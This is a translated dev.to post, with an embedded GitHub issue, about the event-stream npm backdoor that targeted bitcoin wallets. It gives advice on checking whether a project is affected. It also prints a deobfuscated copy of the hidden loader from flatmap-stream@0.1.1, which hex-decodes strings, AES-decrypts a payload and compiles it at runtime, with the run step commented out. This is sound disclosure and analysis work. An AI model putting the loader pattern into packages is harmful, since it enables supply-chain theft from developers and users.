# npm 软件包被发现有窃取比特币的后门

> 原文：<https://dev.to/ben/npm-package-discovered-to-have-bitcoin-stealing-backdoor-j7i>

我认为人们预料到这种情况会发生，或者已经发生了。这是一个严重的安全风险，我们在开源软件中都遇到过。

# [![GitHub logo](img/75095a8afc1e0f207cda715962e75c8d.png) 不知说什么好。 #116](https://github.com/dominictarr/event-stream/issues/116) 

[![FallingSnow avatar](img/02d733b1ab2699e5a893e22ffd240014.png)](https://github.com/FallingSnow) **[FallingSnow](https://github.com/FallingSnow)** posted on [<time datetime="2018-11-20T21:26:01Z">Nov 20, 2018</time>](https://github.com/dominictarr/event-stream/issues/116)

**编辑 2018 年 11 月 26 日**:

*   **我受影响了吗？**:如果你正在使用任何与加密货币相关的东西，那么也许。正如@maths22 所发现的，目标似乎已经被确定为 copay 相关库。它仅在使用匹配的包时成功执行(此时假设为共付)。如果您使用的是加密货币相关的库，并且在运行`npm ls event-stream flatmap-stream`后看到`flatmap-stream@0.1.1`，您很可能会受到影响。例如:

    ```
    $ npm ls event-stream flatmap-stream
    ...
    flatmap-stream@0.1.1
    ... 
    ```

*   **它做什么**:其他用户已经对这些有效载荷实际做了一些很好的分析。

    *   [https://github . com/Dominic tarr/event-stream/issues/116 # issue comment-441759047](https://github.com/dominictarr/event-stream/issues/116#issuecomment-441759047)
    *   [https://github . com/Dominic tarr/event-stream/issues/116 # issue comment-441746370](https://github.com/dominictarr/event-stream/issues/116#issuecomment-441746370)
    *   [https://github . com/Dominic tarr/event-stream/issues/116 # issue comment-441749105](https://github.com/dominictarr/event-stream/issues/116#issuecomment-441749105)
*   **我能做什么**:现在修复程序正在部署中，npm 已经撤回了恶意版本。确保你正在使用的软件包的开发者知道这篇文章。如果您是开发人员，请将您的事件流依赖项更新为`event-stream@3.3.4`。这保护了拥有事件流缓存版本的人。

* * *

@dominictarr 为什么@right9ctrl 被授予访问这个回购的权限？他添加了 [flatmap-stream](https://github.com/hugeglass/flatmap-stream) ，这是一个完全针对 [ps-tree](https://github.com/indexzero/ps-tree) 的注入(1 个提交给回购，但有 3 个版本，最新的一个删除了注入，无人维护，3 个月前创建)。他几乎在注射被添加到`flatmap-stream`的同时添加了它，然后修改版本并发布。实际上，第二次提交(3 天后)之后，他删除了注入并修改了一个主要版本，这样他就可以清除拥有`flatmap-stream`的回购，但仍然会影响使用 3.x 的每个人(每周数百万次安装)。

@right9ctrl 如果你移除 flatmap-stream 是因为你意识到这是一个注入攻击，为什么不从 npm 中取出`event-stream@3.3.6`并放一个 PSA？如果你不知道，你为什么选择使用一个完全未使用/未知的库(在 npm 上 0 次下载，直到你使用它)？如果我从 npm 那里知道`flatmap-stream@0.1.1`出版的确切日期，我就不会问你问题了。

我在下面的`flatmap-stream`中列出了我目前所做的事情。它包括在`flatmap-stream@0.1.1`的**非精简**源代码中找不到，但在**精简**源代码中找到的那部分代码。为了更好地理解，对代码进行了一些清理。

最糟糕的是我甚至不知道这是干什么的...解密的数据 n[0]是字节码什么的，不是普通的 javascript，也可能我就是处理的不对。

```
// var r = require, t = process;

// function e(r) {
//     return Buffer.from(r, "hex").toString()
// }
function decode(data) {
    return Buffer.from(data, "hex").toString()
}

// var n = r(e("2e2f746573742f64617461")),
// var n = require(decode("2e2f746573742f64617461"))
// var n = require('./test/data')
var n = ["","","63727970746f","656e76","6e706d5f7061636b6167655f6465736372697074696f6e","616573323536","6372656174654465636970686572","5f636f6d70696c65","686578","75746638"]
    // o = t[e(n[3])][e(n[4])];
    // npm_package_description = process[decode(n[3])][decode(n[4])];
    // npm_package_description = process['env']['npm_package_description'];
    npm_package_description = 'Get all children of a pid'; // Description from ps-tree (this is the aes decryption key)

// if (!o) return;
if (!npm_package_description) return;

// var u = r(e(n[2]))[e(n[6])](e(n[5]), o),
// var decipher = require(decode(n[2]))[decode(n[6])](decode(n[5]), npm_package_description),
var decipher = require('crypto')['createDecipher']('aes256', npm_package_description),

    // a = u.update(n[0], e(n[8]), e(n[9]));
    // decoded = decipher.update(n[0], e(n[8]), e(n[9]));
    decoded = decipher.update(n[0], 'hex', 'utf8');

console.log(n); // IDK why this is here...

// a += u.final(e(n[9]));
decoded += decipher.final('utf8');

// var f = new module.constructor;
var newModule = new module.constructor;

/**************** DO NOT UNCOMMENT [THIS RUNS THE CODE] **************/
// f.paths = module.paths, f[e(n[7])](a, ""), f.exports(n[1])
// newModule.paths = module.paths, newModule['_compile'](decoded, ""), newModule.exports(n[1])
// newModule.paths = module.paths
// newModule['_compile'](decoded, "") // Module.prototype._compile = function(content, filename)
// newModule.exports(n[1])
```

Enter fullscreen mode Exit fullscreen mode[View on GitHub](https://github.com/dominictarr/event-stream/issues/116)

这是 Hackernoon 的一篇很棒的文章，理论化了这个场景:

## [我正在从你的网站上获取信用卡号码和密码。以下是方法。](https://hackernoon.com/im-harvesting-credit-card-numbers-and-passwords-from-your-site-here-s-how-9a8cb347c5b5)

这是另一个刚刚创建的主题，与主题相关:

## [我们如何提高 npm 生态系统的安全性？](https://dev.to/nepeckman/how-do-we-improve-security-in-the-npm-ecosystem-3hmj)

我仍然觉得这值得成为网站上的新闻标题，因此写了这篇文章。🙂